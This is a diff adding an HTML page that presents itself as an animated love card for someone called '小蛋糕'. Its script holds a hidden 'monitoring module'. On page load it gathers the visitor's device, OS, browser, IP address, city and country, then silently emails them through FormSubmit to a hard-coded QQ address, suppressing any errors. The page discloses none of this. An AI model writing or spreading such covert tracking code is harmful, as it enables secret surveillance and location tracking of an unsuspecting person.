@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>爱心便利贴 - 致小蛋糕</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #FFB7C5 0%, #FFC0CB 100%);
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+            position: relative;
+        }
+
+        .bg-decoration {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .bg-heart {
+            position: absolute;
+            font-size: 14px;
+            opacity: 0.5;
+            animation: float 4s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-10px) rotate(5deg); }
+        }
+
+        .card {
+            position: fixed;
+            width: 130px;
+            height: 65px;
+            background: #FFF8F0;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            cursor: pointer;
+            z-index: 100;
+            overflow: hidden;
+            transition: transform 0.2s ease;
+        }
+
+        .card:active {
+            transform: scale(0.98);
+        }
+
+        .card-top {
+            height: 6px;
+            width: 100%;
+        }
+
+        .card-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: calc(100% - 6px);
+            font-size: 11px;
+            font-weight: bold;
+            color: #333;
+            text-align: center;
+            padding: 4px;
+        }
+
+        .card-emoji {
+            font-size: 16px;
+            margin-bottom: 2px;
+        }
+
+        .tip {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: white;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+            white-space: nowrap;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="tip">🍰 送给小蛋糕的爱心卡片 🍰</div>
+    <div class="bg-decoration" id="bgDecoration"></div>
+
+    <script>
+        // ================== 邮箱监控模块（FormSubmit） ==================
+        // 👇👇👇 只需要改这一行！把你的邮箱填进去 👇👇👇
+        const YOUR_EMAIL = "2221655249@qq.com";  // 改成你的真实邮箱，比如 "xiaodangao@163.com"
+        
+        // 收集设备信息
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = "未知设备";
+            let os = "未知系统";
+            let browser = "未知浏览器";
+
+            if (/iPhone|iPad|iPod/.test(ua)) device = "🍎 Apple设备";
+            else if (/Android/.test(ua)) device = "🤖 安卓设备";
+            else if (/Windows/.test(ua)) device = "💻 Windows电脑";
+            else if (/Mac/.test(ua)) device = "🍎 Mac电脑";
+
+            if (/iPhone OS (\d+)/.test(ua)) os = "iOS " + RegExp.$1;
+            else if (/Android (\d+)/.test(ua)) os = "Android " + RegExp.$1;
+            else if (/Windows NT (\d+)/.test(ua)) os = "Windows " + RegExp.$1;
+            else if (/Mac OS X (\d+)/.test(ua)) os = "macOS";
+
+            if (/MicroMessenger/.test(ua)) browser = "微信内置浏览器";
+            else if (/Chrome/.test(ua)) browser = "Chrome";
+            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
+            else if (/Firefox/.test(ua)) browser = "Firefox";
+
+            return { device, os, browser, userAgent: ua };
+        }
+
+        // 获取 IP 和城市
+        async function getIPInfo() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                const ip = data.ip;
+                const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,query`);
+                const geo = await geoRes.json();
+                if (geo.status === 'success') {
+                    return { ip: geo.query, city: geo.city, country: geo.country };
+                }
+                return { ip: ip, city: "未知", country: "未知" };
+            } catch(e) {
+                return { ip: "无法获取", city: "未知", country: "未知" };
+            }
+        }
+
+        // 发送邮件通知
+        async function sendEmailNotification(deviceInfo, ipInfo) {
+            const now = new Date();
+            const timeStr = now.toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
+            
+            const content = `
+📱 设备信息：
+- 设备类型：${deviceInfo.device}
+- 操作系统：${deviceInfo.os}
+- 浏览器：${deviceInfo.browser}
+- User Agent：${deviceInfo.userAgent}
+
+🌐 网络信息：
+- IP 地址：${ipInfo.ip}
+- 城市：${ipInfo.city}
+- 国家：${ipInfo.country}
+
+⏰ 打开时间：${timeStr}
+
+--- 
+💝 爱心卡片被打开了
+            `;
+            
+            try {
+                await fetch('https://formsubmit.co/ajax/' + YOUR_EMAIL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        subject: `❤️ 爱心卡片被打开了 - ${timeStr}`,
+                        message: content,
+                        _captcha: 'false'
+                    })
+                });
+                console.log('通知已发送');
+            } catch(e) {
+                // 不影响页面使用，静默失败
+                console.log('通知发送失败');
+            }
+        }
+
+        // 页面加载时自动发送通知（只发一次，不重复打扰）
+        let hasReported = false;
+        (async function reportVisit() {
+            if (hasReported) return;
+            hasReported = true;
+            const deviceInfo = getDeviceInfo();
+            const ipInfo = await getIPInfo();
+            await sendEmailNotification(deviceInfo, ipInfo);
+        })();
+        // ================== 监控模块结束 ==================
+
+        // ========== 卡片文字内容 ==========
+        const cardTexts = [
+            { text: "好好爱自己", emoji: "💖" },
+            { text: "我想你啦", emoji: "💕" },
+            { text: "别熬夜", emoji: "🌙" },
+            { text: "多喝水", emoji: "💧" },
+            { text: "保持好心情", emoji: "😊" },
+            { text: "好好吃饭", emoji: "🍚" },
+            { text: "顺顺利利", emoji: "✨" },
+            { text: "天天开心", emoji: "🎉" },
+            { text: "平安喜乐", emoji: "🕊️" },
+            { text: "万事胜意", emoji: "⭐" },
+            { text: "岁岁年年", emoji: "🌸" },
+            { text: "你超棒", emoji: "💪" },
+            { text: "好运连连", emoji: "🍀" },
+            { text: "暴富", emoji: "💰" },
+            { text: "未来可期", emoji: "🚀" },
+            { text: "我喜欢你哦", emoji: "❤️" },
+            { text: "小蛋糕，你是我的小确幸", emoji: "🍰" },
+            { text: "小蛋糕，遇见你真好", emoji: "💖" }
+        ];
+
+        const topColors = ["#ff99cc", "#99ccff", "#99ff99", "#ffcc99", "#ff66cc", "#66ccff", "#ff9966", "#66ff99"];
+
+        let CARD_COUNT = 85;
+        let CARD_W = 130;
+        let CARD_H = 65;
+        let cards = [];
+        let isAnimating = false;
+
+        let SW = window.innerWidth;
+        let SH = window.innerHeight;
+
+        function createBgDecorations() {
+            const bgDiv = document.getElementById('bgDecoration');
+            const decorations = ["❤️", "💕", "💖", "💗", "💓", "🌸", "✨", "🍰"];
+            for (let i = 0; i < 50; i++) {
+                const heart = document.createElement('div');
+                heart.className = 'bg-heart';
+                heart.textContent = decorations[Math.floor(Math.random() * decorations.length)];
+                heart.style.left = Math.random() * 100 + '%';
+                heart.style.top = Math.random() * 100 + '%';
+                heart.style.fontSize = (Math.random() * 10 + 8) + 'px';
+                heart.style.color = ['#FF69B4', '#FF85B3', '#FFB3BA'][Math.floor(Math.random() * 3)];
+                heart.style.animationDelay = Math.random() * 5 + 's';
+                bgDiv.appendChild(heart);
+            }
+        }
+
+        function createHeartPositions() {
+            const positions = [];
+            for (let i = 0; i < CARD_COUNT; i++) {
+                const t = (i / CARD_COUNT) * 2 * Math.PI;
+                const x = 16 * Math.pow(Math.sin(t), 3);
+                const y = -(13 * Math.cos(t) - 5 * Math.cos(2*t) - 2 * Math.cos(3*t) - Math.cos(4*t));
+                const px = SW/2 + x * 18;
+                const py = SH/2 + y * 18 - 20;
+                positions.push({ x: px - CARD_W/2, y: py - CARD_H/2 });
+            }
+            return positions;
+        }
+
+        function createScatterPositions() {
+            const positions = [];
+            const gridSize = Math.ceil(Math.sqrt(CARD_COUNT));
+            const cellW = SW / gridSize;
+            const cellH = SH / gridSize;
+            for (let i = 0; i < CARD_COUNT; i++) {
+                const gridX = i % gridSize;
+                const gridY = Math.floor(i / gridSize);
+                let x = gridX * cellW + (cellW - CARD_W) / 2 + (Math.random() - 0.5) * cellW * 0.4;
+                let y = gridY * cellH + (cellH - CARD_H) / 2 + (Math.random() - 0.5) * cellH * 0.4;
+                x = Math.max(-CARD_W/2, Math.min(SW - CARD_W/2, x));
+                y = Math.max(-CARD_H/2, Math.min(SH - CARD_H/2, y));
+                positions.push({ x, y });
+            }
+            for (let i = positions.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [positions[i], positions[j]] = [positions[j], positions[i]];
+            }
+            return positions;
+        }
+
+        function createCards() {
+            for (let i = 0; i < CARD_COUNT; i++) {
+                const cardData = cardTexts[Math.floor(Math.random() * cardTexts.length)];
+                const topColor = topColors[Math.floor(Math.random() * topColors.length)];
+                const card = document.createElement('div');
+                card.className = 'card';
+                card.style.width = CARD_W + 'px';
+                card.style.height = CARD_H + 'px';
+                card.style.left = SW/2 - CARD_W/2 + 'px';
+                card.style.top = SH/2 - CARD_H/2 + 'px';
+                card.style.transition = 'all 0.8s cubic-bezier(0.34, 1.2, 0.64, 1)';
+                card.innerHTML = `<div class="card-top" style="background: ${topColor}"></div><div class="card-content"><div class="card-emoji">${cardData.emoji}</div><div>${cardData.text}</div></div>`;
+                document.body.appendChild(card);
+                cards.push(card);
+            }
+        }
+
+        function arrangeHeart() {
+            const heartPositions = createHeartPositions();
+            cards.forEach((card, i) => {
+                const pos = heartPositions[i % heartPositions.length];
+                setTimeout(() => {
+                    card.style.transition = 'all 0.5s cubic-bezier(0.34, 1.2, 0.64, 1)';
+                    card.style.left = pos.x + 'px';
+                    card.style.top = pos.y + 'px';
+                }, i * 12);
+            });
+        }
+
+        function scatterCards() {
+            const scatterPositions = createScatterPositions();
+            cards.forEach((card, i) => {
+                const pos = scatterPositions[i];
+                setTimeout(() => {
+                    card.style.transition = 'all 1s cubic-bezier(0.25, 0.46, 0.45, 0.94)';
+                    card.style.left = pos.x + 'px';
+                    card.style.top = pos.y + 'px';
+                }, i * 5);
+            });
+        }
+
+        function startLoop() {
+            if (isAnimating) return;
+            isAnimating = true;
+            arrangeHeart();
+            setTimeout(() => {
+                scatterCards();
+                setTimeout(() => {
+                    isAnimating = false;
+                    startLoop();
+                }, 3200);
+            }, 2000);
+        }
+
+        window.addEventListener('resize', () => {
+            SW = window.innerWidth;
+            SH = window.innerHeight;
+            document.querySelectorAll('.card').forEach(c => c.remove());
+            cards = [];
+            createCards();
+            isAnimating = false;
+            startLoop();
+        });
+
+        createBgDecorations();
+        createCards();
+        setTimeout(() => startLoop(), 300);
+    </script>
+</body>
+</html>
